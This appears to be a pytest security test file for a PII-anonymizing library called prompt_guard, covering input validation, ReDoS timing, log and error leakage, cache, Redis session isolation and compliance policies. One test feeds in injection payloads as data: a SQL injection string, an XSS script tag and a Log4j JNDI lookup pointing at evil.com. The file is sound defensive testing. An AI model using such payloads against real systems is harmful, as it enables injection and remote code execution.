"""
Security and vulnerability tests.

Tests for:
- Input validation
- Injection attacks
- Resource exhaustion
- Data leakage
- Authentication/Authorization
"""

import pytest
from prompt_guard import PromptGuard


class TestInputValidation:
    """Test input validation and sanitization."""

    def test_empty_input(self):
        """Test handling of empty input."""
        guard = PromptGuard()
        anonymized, mapping = guard.anonymize("")

        assert anonymized == ""
        assert len(mapping) == 0

    def test_none_input(self):
        """Test handling of None input."""
        guard = PromptGuard()

        with pytest.raises((TypeError, AttributeError)):
            guard.anonymize(None)

    def test_very_long_input(self):
        """Test handling of very long input (potential DoS)."""
        guard = PromptGuard()

        # 1MB of text
        long_text = "a" * (1024 * 1024)

        try:
            anonymized, mapping = guard.anonymize(long_text)
            assert len(anonymized) > 0
        except Exception as e:
            # Should handle gracefully, not crash
            assert "memory" in str(e).lower() or "timeout" in str(e).lower()

    def test_special_characters(self):
        """Test handling of special characters."""
        guard = PromptGuard()

        special_texts = [
            "Email: test@example.com\x00",  # Null byte
            "Email: test@example.com\r\n",  # CRLF
            "Email: test@example.com\t\t",  # Tabs
            "Email: test@example.com' OR '1'='1",  # SQL injection pattern
            "Email: test@example.com<script>alert('xss')</script>",  # XSS
            "Email: test@example.com${jndi:ldap://evil.com/a}",  # Log4j pattern
        ]

        for text in special_texts:
            anonymized, mapping = guard.anonymize(text)
            assert anonymized is not None
            # Special chars should not break anonymization
            assert "[EMAIL_1]" in anonymized or "EMAIL" in str(mapping)

    def test_unicode_normalization(self):
        """Test Unicode normalization attacks."""
        guard = PromptGuard()

        # Different Unicode representations of same email
        texts = [
            "Email: test@example.com",  # Normal
            "Email: test＠example․com",  # Full-width @, dot
            "Email: test@еxample.com",  # Cyrillic 'е' instead of 'e'
        ]

        results = [guard.anonymize(text) for text in texts]

        # At least the normal one should be detected
        assert any("[EMAIL_" in r[0] or len(r[1]) > 0 for r in results)


class TestRegexSafety:
    """Test regex safety (ReDoS attacks)."""

    def test_redos_email(self):
        """Test for ReDoS vulnerability in email regex."""
        import time

        guard = PromptGuard()

        # Potentially malicious input designed to cause backtracking
        malicious = "a" * 50 + "@" + "a" * 50 + "."

        start = time.time()
        try:
            guard.anonymize(malicious)
        except Exception:
            pass
        duration = time.time() - start

        # Should complete quickly (< 1 second)
        assert duration < 1.0

    def test_redos_phone(self):
        """Test for ReDoS vulnerability in phone regex."""
        import time

        guard = PromptGuard()

        # Potentially malicious input
        malicious = "555-" + "1" * 100

        start = time.time()
        try:
            guard.anonymize(malicious)
        except Exception:
            pass
        duration = time.time() - start

        # Should complete quickly
        assert duration < 1.0


class TestDataLeakage:
    """Test for potential data leakage."""

    def test_no_pii_in_logs(self, caplog):
        """Ensure PII is not logged."""
        import logging

        caplog.set_level(logging.DEBUG)

        guard = PromptGuard()
        sensitive_data = "SSN: 123-45-6789, Email: secret@example.com"

        guard.anonymize(sensitive_data)

        # Check that actual PII is not in logs
        log_text = caplog.text.lower()
        assert "123-45-6789" not in log_text
        assert "secret@example.com" not in log_text

    def test_no_pii_in_error_messages(self):
        """Ensure PII is not exposed in error messages."""
        guard = PromptGuard()

        # Trigger an error with PII in input
        try:
            # Pass invalid argument intentionally
            guard.deanonymize(None, {"[EMAIL_1]": "secret@example.com"})
        except Exception as e:
            error_msg = str(e)
            # Error message should not contain the actual PII
            assert "secret@example.com" not in error_msg

    def test_mapping_isolation(self):
        """Test that mappings are properly isolated between calls."""
        guard = PromptGuard()

        text1 = "Email: user1@example.com"
        text2 = "Email: user2@example.com"

        anon1, map1 = guard.anonymize(text1)
        anon2, map2 = guard.anonymize(text2)

        # Mappings should be independent
        assert map1 != map2
        assert "user1@example.com" not in str(map2)
        assert "user2@example.com" not in str(map1)


class TestCacheSecurity:
    """Test cache security."""

    def test_cache_key_collision_resistance(self):
        """Test that cache keys are collision-resistant."""
        from prompt_guard.cache import create_cache_key

        # Similar texts should have different cache keys
        text1 = "Email: user@example.com"
        text2 = "Email: user@example.org"  # Different domain

        key1 = create_cache_key(text1, "default_pii", ["regex"])
        key2 = create_cache_key(text2, "default_pii", ["regex"])

        assert key1 != key2

    def test_cache_poisoning_resistance(self):
        """Test resistance to cache poisoning."""
        from prompt_guard.cache import InMemoryCache, CachedPromptGuard

        guard = PromptGuard()
        cache = InMemoryCache()
        cached_guard = CachedPromptGuard(guard, cache)

        # Normal usage
        text = "Email: john@example.com"
        result1 = cached_guard.anonymize(text)

        # Try to poison cache by directly manipulating it
        # (This shouldn't affect the guard's behavior)
        for key in list(cache.cache.keys()):
            cache.cache[key].anonymized = "POISONED"

        # Should still work correctly (regenerate if needed)
        result2 = cached_guard.anonymize(text)

        # The cache might return poisoned data, but this tests
        # that the system doesn't crash
        assert result2 is not None


class TestStorageSecurity:
    """Test storage security."""

    @pytest.mark.requires_redis
    def test_redis_connection_security(self):
        """Test Redis connection with authentication."""
        from prompt_guard.storage import RedisMappingStorage

        # Test with invalid credentials (should fail gracefully)
        try:
            storage = RedisMappingStorage(
                redis_url="redis://:wrongpassword@localhost:6379"
            )
            # Try to use it
            session_id = storage.create_session()
            pytest.fail("Should have raised authentication error")
        except Exception as e:
            # Should fail with auth error, not crash
            assert "auth" in str(e).lower() or "connect" in str(e).lower()

    @pytest.mark.requires_redis
    def test_session_isolation(self):
        """Test that sessions are properly isolated."""
        from prompt_guard.storage import RedisMappingStorage

        try:
            storage = RedisMappingStorage(redis_url="redis://localhost:6379")

            # Create two sessions
            session1 = storage.create_session(user_id="user1")
            session2 = storage.create_session(user_id="user2")

            # Store different mappings
            storage.store_mapping(session1, {"[EMAIL_1]": "user1@example.com"})
            storage.store_mapping(session2, {"[EMAIL_1]": "user2@example.com"})

            # Retrieve mappings
            map1 = storage.get_mapping(session1)
            map2 = storage.get_mapping(session2)

            # Should be isolated
            assert map1 != map2
            assert map1["[EMAIL_1]"] == "user1@example.com"
            assert map2["[EMAIL_1]"] == "user2@example.com"

            # Clean up
            storage.delete_mapping(session1)
            storage.delete_mapping(session2)
        except Exception as e:
            pytest.skip(f"Redis not available: {e}")


class TestProxySecurity:
    """Test HTTP proxy security."""

    def test_request_size_limit(self):
        """Test that proxy limits request size (prevents DoS)."""
        # This would be tested in the proxy itself
        # Placeholder for proxy security tests
        pass

    def test_rate_limiting(self):
        """Test rate limiting functionality."""
        # Placeholder for rate limiting tests
        pass

    def test_no_sensitive_headers_leaked(self):
        """Test that sensitive headers are not leaked."""
        # Placeholder for header security tests
        pass


class TestComplianceSecurity:
    """Test compliance-related security."""

    def test_hipaa_data_retention(self):
        """Test HIPAA data retention requirements."""
        guard = PromptGuard(policy="hipaa_phi")

        # Test that policy is loaded correctly
        assert guard.policy["name"] == "hipaa_phi"

        # Verify audit requirements
        assert guard.policy.get("audit", {}).get("required", False) == True

    def test_pci_dss_cvv_never_stored(self):
        """Test that CVV is never stored (PCI-DSS requirement)."""
        guard = PromptGuard(policy="pci_dss")

        text = "Card: 4532-1234-5678-9010, CVV: 123"
        anonymized, mapping = guard.anonymize(text)

        # CVV should not be in the mapping (should be redacted, not stored)
        cvv_in_mapping = any("123" in str(v) for v in mapping.values())
        assert not cvv_in_mapping  # CVV should NOT be in mapping


class TestSideChannelAttacks:
    """Test for side-channel vulnerabilities."""

    def test_timing_attack_resistance(self):
        """Test resistance to timing attacks."""
        import time

        guard = PromptGuard()

        # Measure time for texts with and without PII
        text_with_pii = "Email: john@example.com"
        text_without_pii = "This is a normal text"

        # Run multiple times to get average
        times_with = []
        times_without = []

        for _ in range(100):
            start = time.perf_counter()
            guard.anonymize(text_with_pii)
            times_with.append(time.perf_counter() - start)

            start = time.perf_counter()
            guard.anonymize(text_without_pii)
            times_without.append(time.perf_counter() - start)

        avg_with = sum(times_with) / len(times_with)
        avg_without = sum(times_without) / len(times_without)

        # Timing should not reveal whether PII was present
        # (Some variation is expected, but not orders of magnitude)
        ratio = max(avg_with, avg_without) / min(avg_with, avg_without)
        assert ratio < 10  # Less than 10x difference


class TestErrorHandling:
    """Test error handling security."""

    def test_graceful_degradation(self):
        """Test that errors don't crash the system."""
        guard = PromptGuard()

        # Test various error conditions
        error_cases = [
            ("", "empty string"),
            ("a" * (10 * 1024 * 1024), "very large string"),  # 10MB
            ("\x00\x00\x00", "null bytes"),
            ("💩" * 1000, "emoji spam"),
        ]

        for text, description in error_cases:
            try:
                result = guard.anonymize(text)
                assert result is not None  # Should return something
            except Exception as e:
                # Should be a known exception type, not a crash
                assert isinstance(e, (ValueError, TypeError, MemoryError))

    def test_resource_cleanup_on_error(self):
        """Test that resources are cleaned up on error."""
        import gc
        from prompt_guard.cache import InMemoryCache, CachedPromptGuard

        guard = PromptGuard()
        cache = InMemoryCache(max_size=10)
        cached_guard = CachedPromptGuard(guard, cache)

        initial_size = len(cache)

        # Trigger errors
        for i in range(20):
            try:
                cached_guard.anonymize("a" * (10 * 1024 * 1024))  # Large text
            except:
                pass

        # Force garbage collection
        gc.collect()

        # Cache should not grow unbounded due to errors
        final_size = len(cache)
        assert final_size <= cache.max_size
